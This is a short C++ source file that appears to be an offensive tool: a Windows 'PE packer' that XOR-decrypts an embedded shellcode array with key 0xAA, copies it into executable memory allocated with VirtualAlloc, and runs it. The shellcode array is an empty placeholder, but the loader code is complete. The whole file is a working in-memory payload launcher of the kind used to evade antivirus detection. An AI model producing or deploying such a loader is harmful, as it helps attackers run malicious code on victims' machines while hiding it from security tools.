// Filename: simple_pe_packer.cpp
// Description: Simple PE packer that XORs and loads shellcode to memory (runtime unpacking)
// Author: Joas A Santos

#include <windows.h>
#include <iostream>

unsigned char xor_shellcode[] = {
    // XOR-encrypted shellcode here (key: 0xAA)
};

void DecryptAndExecute() {
    for (size_t i = 0; i < sizeof(xor_shellcode); i++) {
        xor_shellcode[i] ^= 0xAA;
    }

    void* exec = VirtualAlloc(0, sizeof(xor_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, xor_shellcode, sizeof(xor_shellcode));
    ((void(*)())exec)();
}

int main() {
    std::cout << "[+] Decrypting and executing shellcode...\n";
    DecryptAndExecute();
    return 0;
}
